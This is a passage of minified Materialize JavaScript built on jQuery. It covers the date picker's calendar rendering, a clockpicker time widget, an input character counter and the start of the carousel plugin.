                    } i || (r.isInteger(e) || r.isDate(e) || t.isArray(e) || t.isPlainObject(e) && e.from && e.to) && o.push(e)
            })), o
        }, s.prototype.activate = function(e, i) {
            var n = this,
                o = n.item.disable,
                s = o.length;
            return "flip" == i ? n.flipEnable() : !0 === i ? (n.flipEnable(1), o = []) : !1 === i ? (n.flipEnable(-1), o = []) : i.map((function(e) {
                var i, a, l, c;
                for (l = 0; l < s; l += 1) {
                    if (a = o[l], n.isDateExact(a, e)) {
                        i = o[l] = null, c = !0;
                        break
                    }
                    if (n.isDateOverlap(a, e)) {
                        t.isPlainObject(e) ? (e.inverted = !0, i = e) : t.isArray(e) ? (i = e)[3] || i.push("inverted") : r.isDate(e) && (i = [e.getFullYear(), e.getMonth(), e.getDate(), "inverted"]);
                        break
                    }
                }
                if (i)
                    for (l = 0; l < s; l += 1)
                        if (n.isDateExact(o[l], e)) {
                            o[l] = null;
                            break
                        } if (c)
                    for (l = 0; l < s; l += 1)
                        if (n.isDateOverlap(o[l], e)) {
                            o[l] = null;
                            break
                        } i && o.push(i)
            })), o.filter((function(e) {
                return null != e
            }))
        }, s.prototype.nodes = function(e) {
            var t, i, s = this,
                a = s.settings,
                l = s.item,
                c = l.now,
                u = l.select,
                d = l.highlight,
                p = l.view,
                f = l.disable,
                h = l.min,
                v = l.max,
                g = (t = (a.showWeekdaysFull ? a.weekdaysFull : a.weekdaysLetter).slice(0), i = a.weekdaysFull.slice(0), a.firstDay && (t.push(t.shift()), i.push(i.shift())), r.node("thead", r.node("tr", r.group({
                    min: 0,
                    max: 6,
                    i: 1,
                    node: "th",
                    item: function(e) {
                        return [t[e], a.klass.weekdays, 'scope=col title="' + i[e] + '"']
                    }
                })))),
                m = function(e) {
                    return r.node("div", " ", a.klass["nav" + (e ? "Next" : "Prev")] + (e && p.year >= v.year && p.month >= v.month || !e && p.year <= h.year && p.month <= h.month ? " " + a.klass.navDisabled : ""), "data-nav=" + (e || -1) + " " + r.ariaAttr({
                        role: "button",
                        controls: s.$node[0].id + "_table"
                    }) + ' title="' + (e ? a.labelMonthNext : a.labelMonthPrev) + '"')
                },
                y = function(t) {
                    var i = a.showMonthsShort ? a.monthsShort : a.monthsFull;
                    return "short_months" == t && (i = a.monthsShort), a.selectMonths && null == t ? r.node("select", r.group({
                        min: 0,
                        max: 11,
                        i: 1,
                        node: "option",
                        item: function(e) {
                            return [i[e], 0, "value=" + e + (p.month == e ? " selected" : "") + (p.year == h.year && e < h.month || p.year == v.year && e > v.month ? " disabled" : "")]
                        }
                    }), a.klass.selectMonth + " browser-default", (e ? "" : "disabled") + " " + r.ariaAttr({
                        controls: s.$node[0].id + "_table"
                    }) + ' title="' + a.labelMonthSelect + '"') : "short_months" == t ? null != u ? i[u.month] : i[p.month] : r.node("div", i[p.month], a.klass.month)
                },
                b = function(t) {
                    var i = p.year,
                        n = !0 === a.selectYears ? 5 : ~~(a.selectYears / 2);
                    if (n) {
                        var o = h.year,
                            l = v.year,
                            c = i - n,
                            d = i + n;
                        if (o > c && (d += o - c, c = o), l < d) {
                            var f = c - o,
                                g = d - l;
                            c -= f > g ? g : f, d = l
                        }
                        if (a.selectYears && null == t) return r.node("select", r.group({
                            min: c,
                            max: d,
                            i: 1,
                            node: "option",
                            item: function(e) {
                                return [e, 0, "value=" + e + (i == e ? " selected" : "")]
                            }
                        }), a.klass.selectYear + " browser-default", (e ? "" : "disabled") + " " + r.ariaAttr({
                            controls: s.$node[0].id + "_table"
                        }) + ' title="' + a.labelYearSelect + '"')
                    }
                    return "raw" === t && null != u ? r.node("div", u.year) : r.node("div", i, a.klass.year)
                };
            return createDayLabel = function() {
                return null != u ? u.date : c.date
            }, createWeekdayLabel = function() {
                var e;
                return e = null != u ? u.day : c.day, a.weekdaysShort[e]
            }, r.node("div", r.node("div", b("raw"), a.klass.year_display) + r.node("span", createWeekdayLabel() + ", ", "picker__weekday-display") + r.node("span", y("short_months") + " ", a.klass.month_display) + r.node("span", createDayLabel(), a.klass.day_display), a.klass.date_display) + r.node("div", r.node("div", r.node("div", (a.selectYears, y() + b() + m() + m(1)), a.klass.header) + r.node("table", g + r.node("tbody", r.group({
                min: 0,
                max: 5,
                i: 1,
                node: "tr",
                item: function(e) {
                    var t = a.firstDay && 0 === s.create([p.year, p.month, 1]).day ? -7 : 0;
                    return [r.group({
                        min: 7 * e - p.day + t + 1,
                        max: function() {
                            return this.min + 7 - 1
                        },
                        i: 1,
                        node: "td",
                        item: function(e) {
                            e = s.create([p.year, p.month, e + (a.firstDay ? 1 : 0)]);
                            var t, i = u && u.pick == e.pick,
                                n = d && d.pick == e.pick,
                                o = f && s.disabled(e) || e.pick < h.pick || e.pick > v.pick,
                                l = r.trigger(s.formats.toString, s, [a.format, e]);
                            return [r.node("div", e.date, (t = [a.klass.day], t.push(p.month == e.month ? a.klass.infocus : a.klass.outfocus), c.pick == e.pick && t.push(a.klass.now), i && t.push(a.klass.selected), n && t.push(a.klass.highlighted), o && t.push(a.klass.disabled), t.join(" ")), "data-pick=" + e.pick + " " + r.ariaAttr({
                                role: "gridcell",
                                label: l,
                                selected: !(!i || s.$node.val() !== l) || null,
                                activedescendant: !!n || null,
                                disabled: !!o || null
                            }) + " " + (o ? "" : 'tabindex="0"')), "", r.ariaAttr({
                                role: "presentation"
                            })]
                        }
                    })]
                }
            })), a.klass.table, 'id="' + s.$node[0].id + '_table" ' + r.ariaAttr({
                role: "grid",
                controls: s.$node[0].id,
                readonly: !0
            })), a.klass.calendar_container) + r.node("div", r.node("button", a.today, "btn-flat picker__today waves-effect", "type=button data-pick=" + c.pick + (e && !s.disabled(c) ? "" : " disabled") + " " + r.ariaAttr({
                controls: s.$node[0].id
            })) + r.node("button", a.clear, "btn-flat picker__clear waves-effect", "type=button data-clear=1" + (e ? "" : " disabled") + " " + r.ariaAttr({
                controls: s.$node[0].id
            })) + r.node("button", a.close, "btn-flat picker__close waves-effect", "type=button data-close=true " + (e ? "" : " disabled") + " " + r.ariaAttr({
                controls: s.$node[0].id
            })), a.klass.footer), "picker__container__wrapper")
        }, s.defaults = {
            labelMonthNext: "Next month",
            labelMonthPrev: "Previous month",
            labelMonthSelect: "Select a month",
            labelYearSelect: "Select a year",
            monthsFull: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
            monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
            weekdaysFull: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
            weekdaysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
            weekdaysLetter: ["S", "M", "T", "W", "T", "F", "S"],
            today: "Today",
            clear: "Clear",
            close: "Ok",
            closeOnSelect: !1,
            format: "d mmmm, yyyy",
            klass: {
                table: (i = e.klasses().picker + "__") + "table",
                header: i + "header",
                date_display: i + "date-display",
                day_display: i + "day-display",
                month_display: i + "month-display",
                year_display: i + "year-display",
                calendar_container: i + "calendar-container",
                navPrev: i + "nav--prev",
                navNext: i + "nav--next",
                navDisabled: i + "nav--disabled",
                month: i + "month",
                year: i + "year",
                selectMonth: i + "select--month",
                selectYear: i + "select--year",
                weekdays: i + "weekday",
                day: i + "day",
                disabled: i + "day--disabled",
                selected: i + "day--selected",
                highlighted: i + "day--highlighted",
                now: i + "day--today",
                infocus: i + "day--infocus",
                outfocus: i + "day--outfocus",
                footer: i + "footer",
                buttonClear: i + "button--clear",
                buttonToday: i + "button--today",
                buttonClose: i + "button--close"
            }
        }, e.extend("pickadate", s)
    }(Materialize.Picker, jQuery),
    function(e) {
        var t, i, n, o = e(window),
            r = e(document),
            s = "http://www.w3.org/2000/svg",
            a = "SVGAngle" in window && ((i = document.createElement("div")).innerHTML = "<svg/>", t = (i.firstChild && i.firstChild.namespaceURI) == s, i.innerHTML = "", t),
            l = "transition" in (n = document.createElement("div").style) || "WebkitTransition" in n || "MozTransition" in n || "msTransition" in n || "OTransition" in n,
            c = "ontouchstart" in window,
            u = "mousedown" + (c ? " touchstart" : ""),
            d = "mousemove.clockpicker" + (c ? " touchmove.clockpicker" : ""),
            p = "mouseup.clockpicker" + (c ? " touchend.clockpicker" : ""),
            f = navigator.vibrate ? "vibrate" : navigator.webkitVibrate ? "webkitVibrate" : null;

        function h(e) {
            return document.createElementNS(s, e)
        }

        function v(e) {
            return (e < 10 ? "0" : "") + e
        }
        var g = 0,
            m = 135,
            y = 105,
            b = 20,
            w = l ? 350 : 1,
            x = ['<div class="clockpicker picker">', '<div class="picker__holder">', '<div class="picker__frame">', '<div class="picker__wrap">', '<div class="picker__box">', '<div class="picker__date-display">', '<div class="clockpicker-display">', '<div class="clockpicker-display-column">', '<span class="clockpicker-span-hours text-primary"></span>', ":", '<span class="clockpicker-span-minutes"></span>', "</div>", '<div class="clockpicker-display-column clockpicker-display-am-pm">', '<div class="clockpicker-span-am-pm"></div>', "</div>", "</div>", "</div>", '<div class="picker__container__wrapper">', '<div class="picker__calendar-container">', '<div class="clockpicker-plate">', '<div class="clockpicker-canvas"></div>', '<div class="clockpicker-dial clockpicker-hours"></div>', '<div class="clockpicker-dial clockpicker-minutes clockpicker-dial-out"></div>', "</div>", '<div class="clockpicker-am-pm-block">', "</div>", "</div>", '<div class="picker__footer">', "</div>", "</div>", "</div>", "</div>", "</div>", "</div>", "</div>"].join("");

        function k(t, i) {
            var n = e(x),
                o = n.find(".clockpicker-plate"),
                s = n.find(".picker__holder"),
                l = n.find(".clockpicker-hours"),
                c = n.find(".clockpicker-minutes"),
                f = n.find(".clockpicker-am-pm-block"),
                k = "INPUT" === t.prop("tagName"),
                T = k ? t : t.find("input"),
                S = e("label[for=" + T.attr("id") + "]"),
                A = this;
            this.id = function(e) {
                var t = ++g + "";
                return "cp" + t
            }(), this.element = t, this.holder = s, this.options = i, this.isAppended = !1, this.isShown = !1, this.currentView = "hours", this.isInput = k, this.input = T, this.label = S, this.popover = n, this.plate = o, this.hoursView = l, this.minutesView = c, this.amPmBlock = f, this.spanHours = n.find(".clockpicker-span-hours"), this.spanMinutes = n.find(".clockpicker-span-minutes"), this.spanAmPm = n.find(".clockpicker-span-am-pm"), this.footer = n.find(".picker__footer"), this.amOrPm = "PM", i.twelvehour && (i.ampmclickable ? (this.spanAmPm.empty(), e('<div id="click-am">AM</div>').on("click", (function() {
                A.spanAmPm.children("#click-am").addClass("text-primary"), A.spanAmPm.children("#click-pm").removeClass("text-primary"), A.amOrPm = "AM"
            })).appendTo(this.spanAmPm), e('<div id="click-pm">PM</div>').on("click", (function() {
                A.spanAmPm.children("#click-pm").addClass("text-primary"), A.spanAmPm.children("#click-am").removeClass("text-primary"), A.amOrPm = "PM"
            })).appendTo(this.spanAmPm)) : (this.spanAmPm.empty(), e('<div id="click-am">AM</div>').appendTo(this.spanAmPm), e('<div id="click-pm">PM</div>').appendTo(this.spanAmPm))), e('<button type="button" class="btn-flat picker__clear" tabindex="' + (i.twelvehour ? "3" : "1") + '">' + i.cleartext + "</button>").click(e.proxy(this.clear, this)).appendTo(this.footer), e('<button type="button" class="btn-flat picker__close" tabindex="' + (i.twelvehour ? "3" : "1") + '">' + i.canceltext + "</button>").click(e.proxy(this.hide, this)).appendTo(this.footer), e('<button type="button" class="btn-flat picker__close" tabindex="' + (i.twelvehour ? "3" : "1") + '">' + i.donetext + "</button>").click(e.proxy(this.done, this)).appendTo(this.footer), this.spanHours.click(e.proxy(this.toggleView, this, "hours")), this.spanMinutes.click(e.proxy(this.toggleView, this, "minutes")), T.on("focus.clockpicker click.clockpicker", e.proxy(this.show, this));
            var $, E, P, O, D = e('<div class="clockpicker-tick"></div>');
            if (i.twelvehour)
                for ($ = 1; $ < 13; $ += 1) E = D.clone(), P = $ / 6 * Math.PI, O = y, E.css({
                    left: m + Math.sin(P) * O - b,
                    top: m - Math.cos(P) * O - b
                }), E.html(0 === $ ? "00" : $), l.append(E), E.on(u, M);
            else
                for ($ = 0; $ < 24; $ += 1) E = D.clone(), P = $ / 6 * Math.PI, O = $ > 0 && $ < 13 ? 70 : y, E.css({
                    left: m + Math.sin(P) * O - b,
                    top: m - Math.cos(P) * O - b
                }), E.html(0 === $ ? "00" : $), l.append(E), E.on(u, M);
            for ($ = 0; $ < 60; $ += 5) E = D.clone(), P = $ / 30 * Math.PI, E.css({
                left: m + Math.sin(P) * y - b,
                top: m - Math.cos(P) * y - b
            }), E.html(v($)), c.append(E), E.on(u, M);

            function M(e, t) {
                var n = o.offset(),
                    s = /^touch/.test(e.type),
                    a = n.left + m,
                    l = n.top + m,
                    c = (s ? e.originalEvent.touches[0] : e).pageX - a,
                    u = (s ? e.originalEvent.touches[0] : e).pageY - l,
                    f = Math.sqrt(c * c + u * u),
                    h = !1;
                if (!t || !(f < 85 || f > 125)) {
                    e.preventDefault();
                    var v = setTimeout((function() {
                        A.popover.addClass("clockpicker-moving")
                    }), 200);
                    A.setHand(c, u, !t, !0), r.off(d).on(d, (function(e) {
                        e.preventDefault();
                        var t = /^touch/.test(e.type),
                            i = (t ? e.originalEvent.touches[0] : e).pageX - a,
                            n = (t ? e.originalEvent.touches[0] : e).pageY - l;
                        (h || i !== c || n !== u) && (h = !0, A.setHand(i, n, !1, !0))
                    })), r.off(p).on(p, (function(e) {
                        r.off(p), e.preventDefault();
                        var n = /^touch/.test(e.type),
                            s = (n ? e.originalEvent.changedTouches[0] : e).pageX - a,
                            f = (n ? e.originalEvent.changedTouches[0] : e).pageY - l;
                        (t || h) && s === c && f === u && A.setHand(s, f), "hours" === A.currentView ? A.toggleView("minutes", w / 2) : i.autoclose && (A.minutesView.addClass("clockpicker-dial-out"), setTimeout((function() {
                            A.done()
                        }), w / 2)), o.prepend(j), clearTimeout(v), A.popover.removeClass("clockpicker-moving"), r.off(d)
                    }))
                }
            }
            if (o.on(u, (function(t) {
                    0 === e(t.target).closest(".clockpicker-tick").length && M(t, !0)
                })), a) {
                var j = n.find(".clockpicker-canvas"),
                    q = h("svg");
                q.setAttribute("class", "clockpicker-svg"), q.setAttribute("width", 270), q.setAttribute("height", 270);
                var L = h("g");
                L.setAttribute("transform", "translate(135,135)");
                var H = h("circle");
                H.setAttribute("class", "clockpicker-canvas-bearing"), H.setAttribute("cx", 0), H.setAttribute("cy", 0), H.setAttribute("r", 4);
                var N = h("line");
                N.setAttribute("x1", 0), N.setAttribute("y1", 0);
                var I = h("circle");
                I.setAttribute("class", "clockpicker-canvas-bg"), I.setAttribute("r", b), L.appendChild(N), L.appendChild(I), L.appendChild(H), q.appendChild(L), j.append(q), this.hand = N, this.bg = I, this.bearing = H, this.g = L, this.canvas = j
            }
            C(this.options.init)
        }

        function C(e) {
            e && "function" == typeof e && e()
        }
        k.DEFAULTS = {
            default: "",
            fromnow: 0,
            donetext: "Ok",
            cleartext: "Clear",
            canceltext: "Cancel",
            autoclose: !1,
            ampmclickable: !0,
            darktheme: !1,
            twelvehour: !0,
            vibrate: !0
        }, k.prototype.toggle = function() {
            this[this.isShown ? "hide" : "show"]()
        }, k.prototype.locate = function() {
            var e = this.element,
                t = this.popover;
            e.offset(), e.outerWidth(), e.outerHeight(), this.options.align, t.show()
        }, k.prototype.show = function(t) {
            if (!this.isShown) {
                C(this.options.beforeShow), e(":input").each((function() {
                    e(this).attr("tabindex", -1)
                }));
                var i = this;
                this.input.blur(), this.popover.addClass("picker--opened"), this.input.addClass("picker__input picker__input--active"), e(document.body).css("overflow", "hidden");
                var n = ((this.input.prop("value") || this.options.default || "") + "").split(":");
                if (this.options.twelvehour && void 0 !== n[1] && (n[1].indexOf("AM") > 0 ? this.amOrPm = "AM" : this.amOrPm = "PM", n[1] = n[1].replace("AM", "").replace("PM", "")), "now" === n[0]) {
                    var s = new Date(+new Date + this.options.fromnow);
                    n = [s.getHours(), s.getMinutes()], this.options.twelvehour && (this.amOrPm = n[0] >= 12 && n[0] < 24 ? "PM" : "AM")
                }
                if (this.hours = +n[0] || 0, this.minutes = +n[1] || 0, this.spanHours.html(this.hours), this.spanMinutes.html(v(this.minutes)), !this.isAppended) {
                    var a = document.querySelector(this.options.container);
                    this.options.container && a ? a.appendChild(this.popover[0]) : this.popover.insertAfter(this.input), this.options.twelvehour && ("PM" === this.amOrPm ? (this.spanAmPm.children("#click-pm").addClass("text-primary"), this.spanAmPm.children("#click-am").removeClass("text-primary")) : (this.spanAmPm.children("#click-am").addClass("text-primary"), this.spanAmPm.children("#click-pm").removeClass("text-primary"))), o.on("resize.clockpicker" + this.id, (function() {
                        i.isShown && i.locate()
                    })), this.isAppended = !0
                }
                this.toggleView("hours"), this.locate(), this.isShown = !0, r.on("click.clockpicker." + this.id + " focusin.clockpicker." + this.id, (function(t) {
                    var n = e(t.target);
                    0 === n.closest(i.popover.find(".picker__wrap")).length && 0 === n.closest(i.input).length && i.hide()
                })), r.on("keyup.clockpicker." + this.id, (function(e) {
                    27 === e.keyCode && i.hide()
                })), C(this.options.afterShow)
            }
        }, k.prototype.hide = function() {
            C(this.options.beforeHide), this.input.removeClass("picker__input picker__input--active"), this.popover.removeClass("picker--opened"), e(document.body).css("overflow", "visible"), this.isShown = !1, e(":input").each((function(t) {
                e(this).attr("tabindex", t + 1)
            })), r.off("click.clockpicker." + this.id + " focusin.clockpicker." + this.id), r.off("keyup.clockpicker." + this.id), this.popover.hide(), C(this.options.afterHide)
        }, k.prototype.toggleView = function(t, i) {
            var n = !1;
            "minutes" === t && "visible" === e(this.hoursView).css("visibility") && (C(this.options.beforeHourSelect), n = !0);
            var o = "hours" === t,
                r = o ? this.hoursView : this.minutesView,
                s = o ? this.minutesView : this.hoursView;
            this.currentView = t, this.spanHours.toggleClass("text-primary", o), this.spanMinutes.toggleClass("text-primary", !o), s.addClass("clockpicker-dial-out"), r.css("visibility", "visible").removeClass("clockpicker-dial-out"), this.resetClock(i), clearTimeout(this.toggleViewTimer), this.toggleViewTimer = setTimeout((function() {
                s.css("visibility", "hidden")
            }), w), n && C(this.options.afterHourSelect)
        }, k.prototype.resetClock = function(e) {
            var t = this.currentView,
                i = this[t],
                n = "hours" === t,
                o = i * (Math.PI / (n ? 6 : 30)),
                r = n && i > 0 && i < 13 ? 70 : y,
                s = Math.sin(o) * r,
                l = -Math.cos(o) * r,
                c = this;
            a && e ? (c.canvas.addClass("clockpicker-canvas-out"), setTimeout((function() {
                c.canvas.removeClass("clockpicker-canvas-out"), c.setHand(s, l)
            }), e)) : this.setHand(s, l)
        }, k.prototype.setHand = function(t, i, n, o) {
            var r, s = Math.atan2(t, -i),
                l = "hours" === this.currentView,
                c = Math.PI / (l || n ? 6 : 30),
                u = Math.sqrt(t * t + i * i),
                d = this.options,
                p = l && u < 87.5,
                h = p ? 70 : y;
            if (d.twelvehour && (h = y), s < 0 && (s = 2 * Math.PI + s), s = (r = Math.round(s / c)) * c, d.twelvehour ? l ? 0 === r && (r = 12) : (n && (r *= 5), 60 === r && (r = 0)) : l ? (12 === r && (r = 0), r = p ? 0 === r ? 12 : r : 0 === r ? 0 : r + 12) : (n && (r *= 5), 60 === r && (r = 0)), this[this.currentView] !== r && f && this.options.vibrate && (this.vibrateTimer || (navigator[f](10), this.vibrateTimer = setTimeout(e.proxy((function() {
                    this.vibrateTimer = null
                }), this), 100))), this[this.currentView] = r, l ? this.spanHours.html(r) : this.spanMinutes.html(v(r)), a) {
                var g = Math.sin(s) * (h - b),
                    m = -Math.cos(s) * (h - b),
                    w = Math.sin(s) * h,
                    x = -Math.cos(s) * h;
                this.hand.setAttribute("x2", g), this.hand.setAttribute("y2", m), this.bg.setAttribute("cx", w), this.bg.setAttribute("cy", x)
            } else this[l ? "hoursView" : "minutesView"].find(".clockpicker-tick").each((function() {
                var t = e(this);
                t.toggleClass("active", r === +t.html())
            }))
        }, k.prototype.done = function() {
            C(this.options.beforeDone), this.hide(), this.label.addClass("active");
            var e = this.input.prop("value"),
                t = v(this.hours) + ":" + v(this.minutes);
            this.options.twelvehour && (t += this.amOrPm), this.input.prop("value", t), t !== e && (this.input.triggerHandler("change"), this.isInput || this.element.trigger("change")), this.options.autoclose && this.input.trigger("blur"), C(this.options.afterDone)
        }, k.prototype.clear = function() {
            this.hide(), this.label.removeClass("active");
            var e = this.input.prop("value");
            this.input.prop("value", ""), "" !== e && (this.input.triggerHandler("change"), this.isInput || this.element.trigger("change")), this.options.autoclose && this.input.trigger("blur")
        }, k.prototype.remove = function() {
            this.element.removeData("clockpicker"), this.input.off("focus.clockpicker click.clockpicker"), this.isShown && this.hide(), this.isAppended && (o.off("resize.clockpicker" + this.id), this.popover.remove())
        }, e.fn.pickatime = function(t) {
            var i = Array.prototype.slice.call(arguments, 1);
            return this.each((function() {
                var n = e(this),
                    o = n.data("clockpicker");
                if (o) "function" == typeof o[t] && o[t].apply(o, i);
                else {
                    var r = e.extend({}, k.DEFAULTS, n.data(), "object" == typeof t && t);
                    n.data("clockpicker", new k(n, r))
                }
            }))
        }
    }(jQuery),
    function(e) {
        function t() {
            var t = +e(this).attr("data-length"),
                i = +e(this).val().length,
                n = i <= t;
            e(this).parent().find('span[class="character-counter"]').html(i + "/" + t),
                function(e, t) {
                    var i = t.hasClass("invalid");
                    e && i ? t.removeClass("invalid") : e || i || (t.removeClass("valid"), t.addClass("invalid"))
                }(n, e(this))
        }

        function i() {
            e(this).parent().find('span[class="character-counter"]').html("")
        }
        e.fn.characterCounter = function() {
            return this.each((function() {
                var n = e(this);
                n.parent().find('span[class="character-counter"]').length || void 0 !== n.attr("data-length") && (n.on("input", t), n.on("focus", t), n.on("blur", i), function(t) {
                    var i = t.parent().find('span[class="character-counter"]');
                    i.length || (i = e("<span/>").addClass("character-counter").css("float", "right").css("font-size", "12px").css("height", 1), t.parent().append(i))
                }(n))
            }))
        }, e(document).ready((function() {
            e("input, textarea").characterCounter()
        }))
    }(jQuery),
    function(e) {
        var t = {
            init: function(t) {
                t = e.extend({
                    duration: 200,
                    dist: -100,
                    shift: 0,
                    padding: 0,
                    fullWidth: !1,
                    indicators: !1,
                    noWrap: !1,
                    onCycleTo: null
                }, t);
                var i = Materialize.objectSelectorString(e(this));
                return this.each((function(n) {
                    var o, r, s, a, l, c, u, d, p, f, h, v, g, m, b, w, x, k, C, T = e('<ul class="indicators"></ul>'),
                        S = null,
                        A = null,
                        $ = e(this),
                        E = $.find(".carousel-item").length > 1,
                        P = ($.attr("data-indicators") || t.indicators) && E,
                        O = $.attr("data-no-wrap") || t.noWrap || !E,
                        D = $.attr("data-namespace") || i + n;
                    $.attr("data-namespace", D);
                    var M = function(t) {
                        var i = $.find(".carousel-item.active").length ? $.find(".carousel-item.active").first() : $.find(".carousel-item").first(),
                            n = i.find("img").first();
                        if (n.length)
                            if (n[0].complete)
                                if (n.height() > 0) $.css("height", n.height());
                                else {
                                    var o = n[0].naturalWidth,
                                        r = n[0].naturalHeight,
                                        s = $.width() / o * r;
                                    $.css("height", s)
                                }
                        else n.on("load", (function() {
                            $.css("height", e(this).height())
                        }));
                        else if (!t) {
                            var a = i.height();
                            $.css("height", a)
                        }
                    };
                    if (t.fullWidth && (t.dist = 0, M(), P && $.find(".carousel-fixed-item").addClass("with-indicators")), $.hasClass("initialized")) return e(window).trigger("resize"), $.trigger("carouselNext", [1e-6]), !0;

                    function j(e) {
                        return e.targetTouches && e.targetTouches.length >= 1 ? e.targetTouches[0].clientX : e.clientX
                    }

                    function q(e) {
                        return e.targetTouches && e.targetTouches.length >= 1 ? e.targetTouches[0].clientY : e.clientY
                    }

                    function L(e) {
                        return e >= d ? e % d : e < 0 ? L(d + e % d) : e
                    }

                    function H(i) {
                        var n, c, p, f, h, v, g;
                        $.hasClass("scrolling") || $.addClass("scrolling"), null != S && window.clearTimeout(S), S = window.setTimeout((function() {
                            $.removeClass("scrolling")
                        }), t.duration);
                        var y = l;
                        if (a = "number" == typeof i ? i : a, l = Math.floor((a + u / 2) / u), h = -(f = (p = a - l * u) < 0 ? 1 : -1) * p * 2 / u, c = d >> 1, t.fullWidth ? g = "translateX(0)" : (g = "translateX(" + ($[0].clientWidth - r) / 2 + "px) ", g += "translateY(" + ($[0].clientHeight - s) / 2 + "px)"), P) {
                            var b = l % d,
                                w = T.find(".indicator-item.active");
                            w.index() !== b && (w.removeClass("active"), T.find(".indicator-item").eq(b).addClass("active"))
                        }
                        for ((!O || l >= 0 && l < d) && (v = o[L(l)], e(v).hasClass("active") || ($.find(".carousel-item").removeClass("active"), e(v).addClass("active")), v.style[m] = g + " translateX(" + -p / 2 + "px) translateX(" + f * t.shift * h * n + "px) translateZ(" + t.dist * h + "px)", v.style.zIndex = 0, t.fullWidth ? tweenedOpacity = 1 : tweenedOpacity = 1 - .2 * h, v.style.opacity = tweenedOpacity, v.style.display = "block"), n = 1; n <= c; ++n) t.fullWidth ? (zTranslation = t.dist, tweenedOpacity = n === c && p < 0 ? 1 - h : 1) : (zTranslation = t.dist * (2 * n + h * f), tweenedOpacity = 1 - .2 * (2 * n + h * f)), (!O || l + n < d) && ((v = o[L(l + n)]).style[m] = g + " translateX(" + (t.shift + (u * n - p) / 2) + "px) translateZ(" + zTranslation + "px)", v.style.zIndex = -n, v.style.opacity = tweenedOpacity, v.style.display = "block"), t.fullWidth ? (zTranslation = t.dist, tweenedOpacity = n === c && p > 0 ? 1 - h : 1) : (zTranslation = t.dist * (2 * n - h * f), tweenedOpacity = 1 - .2 * (2 * n - h * f)), (!O || l - n >= 0) && ((v = o[L(l - n)]).style[m] = g + " translateX(" + (-t.shift + (-u * n - p) / 2) + "px) translateZ(" + zTranslation + "px)", v.style.zIndex = -n, v.style.opacity = tweenedOpacity, v.style.display = "block");
                        if ((!O || l >= 0 && l < d) && ((v = o[L(l)]).style[m] = g + " translateX(" + -p / 2 + "px) translateX(" + f * t.shift * h + "px) translateZ(" + t.dist * h + "px)", v.style.zIndex = 0, t.fullWidth ? tweenedOpacity = 1 : tweenedOpacity = 1 - .2 * h, v.style.opacity = tweenedOpacity, v.style.display = "block"), y !== l && "function" == typeof t.onCycleTo) {
                            var x = $.find(".carousel-item").eq(L(l));
                            t.onCycleTo.call(this, x, k)
                        }
                        "function" == typeof A && (A.call(this, x, k), A = null)
                    }

                    function N() {
                        var e, t, i;
                        t = (e = Date.now()) - w, w = e, i = a - b, b = a, g = 1e3 * i / (1 + t) * .8 + .2 * g
                    }

                    function I() {
                        var e, i;
                        h && (e = Date.now() - w, (i = h * Math.exp(-e / t.duration)) > 2 || i < -2 ? (H(v - i), requestAnimationFrame(I)) : H(v))
                    }

                    function _(e) {
                        var t = l % d - e;
                        O || (t < 0 ? Math.abs(t + d) < Math.abs(t) && (t += d) : t > 0 && Math.abs(t - d) < t && (t -= d)), t < 0 ? $.trigger("carouselNext", [Math.abs(t)]) : t > 0 && $.trigger("carouselPrev", [t])
                    }

                    function W(t) {
                        "mousedown" === t.type && e(t.target).is("img") && t.preventDefault(), c = !0, k = !1, C = !1, p = j(t), f = q(t), g = h = 0, b = a, w = Date.now(), clearInterval(x), x = setInterval(N, 100)
                    }

                    function R(e) {
                        var t, i;
                        if (c)
                            if (t = j(e), y = q(e), i = p - t, Math.abs(f - y) < 30 && !C)(i > 2 || i < -2) && (k = !0, p = t, H(a + i));
                            else {
                                if (k) return e.preventDefault(), e.stopPropagation(), !1;
                                C = !0
                            } if (k) return e.preventDefault(), e.stopPropagation(), !1
                    }

                    function F(e) {
                        if (c) return c = !1, clearInterval(x), v = a, (g > 10 || g < -10) && (v = a + (h = .9 * g)), v = Math.round(v / u) * u, O && (v >= u * (d - 1) ? v = u * (d - 1) : v < 0 && (v = 0)), h = v - a, w = Date.now(), requestAnimationFrame(I), k && (e.preventDefault(), e.stopPropagation()), !1
                    }
                    $.addClass("initialized"), c = !1, a = v = 0, o = [], r = $.find(".carousel-item").first().innerWidth(), s = $.find(".carousel-item").first().innerHeight(), u = 2 * r + t.padding, $.find(".carousel-item").each((function(t) {
                        if (o.push(e(this)[0]), P) {
                            var i = e('<li class="indicator-item"></li>');
                            0 === t && i.addClass("active"), i.click((function(t) {
                                t.stopPropagation(), _(e(this).index())
                            })), T.append(i)
                        }
                    })), P && $.append(T), d = o.length, m = "transform", ["webkit", "Moz", "O", "ms"].every((function(e) {
                        var t = e + "Transform";
                        return void 0 === document.body.style[t] || (m = t, !1)
                    }));
                    var V = Materialize.throttle((function() {
                        t.fullWidth ? (r = $.find(".carousel-item").first().innerWidth(), $.find(".carousel-item.active").height(), u = 2 * r + t.padding, v = a = 2 * l * r, M(!0)) : H()
                    }), 200);
                    e(window).off("resize.carousel-" + D).on("resize.carousel-" + D, V), void 0 !== window.ontouchstart && ($.on("touchstart.carousel", W), $.on("touchmove.carousel", R), $.on("touchend.carousel", F)), $.on("mousedown.carousel", W), $.on("mousemove.carousel", R), $.on("mouseup.carousel", F), $.on("mouseleave.carousel", F), $.on("click.carousel", (function z(i) {
                        if (k) return i.preventDefault(), i.stopPropagation(), !1;
                        if (!t.fullWidth) {
                            var n = e(i.target).closest(".carousel-item").index();
                            0 != L(l) - n && (i.preventDefault(), i.stopPropagation()), _(n)
                        }
                    })), H(a), e(this).on("carouselNext", (function(e, t, i) {
                        void 0 === t && (t = 1), "function" == typeof i && (A = i), v = u * Math.round(a / u) + u * t, a !== v && (h = v - a, w = Date.now(), requestAnimationFrame(I))
                    })), e(this).on("carouselPrev", (function(e, t, i) {
                        void 0 === t && (t = 1), "function" == typeof i && (A = i), v = u * Math.round(a / u) - u * t, a !== v && (h = v - a, w = Date.now(), requestAnimationFrame(I))
                    })), e(this).on("carouselSet", (function(e, t, i) {
                        void 0 === t && (t = 0), "function" == typeof i && (A = i), _(t)
                    }))
                }))
            },
            next: function(t, i) {
                e(this).trigger("carouselNext", [t, i])
            },
